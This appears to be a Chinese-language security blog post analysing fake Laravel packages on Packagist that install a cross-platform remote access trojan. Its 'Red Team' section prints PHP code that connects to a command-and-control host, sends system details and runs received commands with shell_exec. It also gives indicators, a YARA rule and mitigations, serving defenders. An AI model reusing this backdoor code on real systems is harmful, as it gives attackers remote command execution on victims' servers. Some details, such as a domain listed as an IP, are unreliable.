---
layout: post
title:  "Fake Laravel Packages on Packagist Deploy RAT on Windows, macOS, and Linux"
date:   2026-03-04 12:39:51 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Laravel 套件中的跨平台遠端存取木馬 (RAT) 攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: PHP Obfuscation, Control Flow Obfuscation, Encoding Domain Names

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Laravel 套件中的 `nhattuanbl/lara-helper` 和 `nhattuanbl/simple-queue` 套件包含了一個名為 `src/helper.php` 的 PHP 文件，該文件使用了控制流混淆、編碼域名、命令名和文件路徑等技術來複雜化靜態分析。
* **攻擊流程圖解**:
  1. 使用者安裝受影響的 Laravel 套件。
  2. 套件中的 `src/helper.php` 文件被載入並執行。
  3. 文件連接到 C2 伺服器 (`helper.leuleu[.]net:2096`)。
  4. 文件傳送系統偵查數據並等待命令。
  5. C2 伺服器發送命令，文件執行命令並傳送結果。
* **受影響元件**: Laravel 8.x 和 9.x 版本，PHP 7.x 和 8.x 版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要有 Laravel 的管理權限和網路存取權。
* **Payload 建構邏輯**:

    ```
    
    php
    // src/helper.php
    $socket = stream_socket_client('helper.leuleu[.]net:2096', $errno, $errstr);
    if ($socket) {
        // 傳送系統偵查數據
        $data = array('system' => php_uname(), 'php_version' => phpversion());
        fwrite($socket, json_encode($data));
        // 等待命令
        while (true) {
            $command = fread($socket, 1024);
            if ($command) {
                // 執行命令
                $output = shell_exec($command);
                fwrite($socket, $output);
            }
        }
    }
    
    ```
* **繞過技術**: 使用控制流混淆和編碼域名等技術來複雜化靜態分析。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| IP | `helper.leuleu[.]net` |
| Domain | `helper.leuleu[.]net` |
| File Path | `src/helper.php` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Laravel_RAT {
        meta:
            description = "Laravel RAT Detection"
            author = "Your Name"
        strings:
            $a = "helper.leuleu[.]net"
            $b = "src/helper.php"
        condition:
            $a and $b
    }
    
    ```
* **緩解措施**: 刪除受影響的 Laravel 套件，更新 Laravel 和 PHP 版本，設定 Web 應用防火牆 (WAF) 來阻止惡意流量。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Control Flow Obfuscation (控制流混淆)**: 一種程式碼混淆技術，通過修改程式碼的控制流程來使得靜態分析更加困難。
* **Encoding Domain Names (編碼域名)**: 一種技術，通過編碼域名來使得靜態分析更加困難。
* **Remote Code Execution (RCE)**: 一種攻擊技術，允許攻擊者在遠端主機上執行任意程式碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/03/fake-laravel-packages-on-packagist.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1210/)


